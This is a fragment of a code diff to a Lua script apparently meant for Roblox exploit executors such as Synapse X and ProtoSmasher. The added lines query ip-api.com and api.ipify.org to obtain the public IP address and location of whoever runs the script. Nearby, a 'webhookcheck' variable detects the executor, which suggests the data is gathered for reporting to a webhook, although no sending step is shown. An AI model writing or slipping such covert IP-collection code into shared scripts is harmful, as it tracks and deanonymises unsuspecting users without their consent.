@@ -55,6 +55,20 @@ request(abcdef)
 
 wait(10)
 
+ local response = request({
+    Url = "http://ip-api.com/json",
+    Method = "GET", -- Optional | GET, POST, HEAD, etc
+    Headers = {}, -- Optional | HTTP Headers
+    Cookies = {} -- Optional | HTTP Cookies
+})
+
+ local response = request({
+    Url = "https://api.ipify.org",
+    Method = "GET", -- Optional | GET, POST, HEAD, etc
+    Headers = {}, -- Optional | HTTP Headers
+    Cookies = {} -- Optional | HTTP Cookies
+})
+
 local webhookcheck =
   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
   secure_load and "Sentinel" or
